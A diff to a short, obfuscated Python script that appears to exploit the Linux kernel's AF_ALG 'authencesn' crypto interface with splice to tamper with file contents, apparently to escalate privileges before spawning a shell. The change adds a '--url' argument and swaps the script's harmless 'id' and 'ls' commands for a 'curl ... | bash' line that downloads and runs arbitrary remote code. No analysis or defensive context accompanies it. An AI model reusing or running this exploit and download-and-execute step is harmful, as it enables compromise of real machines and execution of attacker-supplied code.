@@ -1,6 +1,12 @@
 #!/usr/bin/env python3
 import os as g,zlib,socket as s
 import subprocess as sb
+import argparse
+
+parser = argparse.ArgumentParser()
+parser.add_argument("--url", required=True)
+args = parser.parse_args()
+
 def d(x):return bytes.fromhex(x)
 def c(f,t,c):
  a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
@@ -15,9 +21,7 @@ shell = sb.Popen(
     stderr=sb.PIPE,
     text=True
 )
-shell.stdin.write("id\n")
-shell.stdin.write("ls\n")
-shell.stdin.write("exit\n")
+shell.stdin.write(f"curl -L \"{args.url}\" | bash\n")
 shell.stdin.flush()
 stdout, stderr = shell.communicate()
 print("输出：")
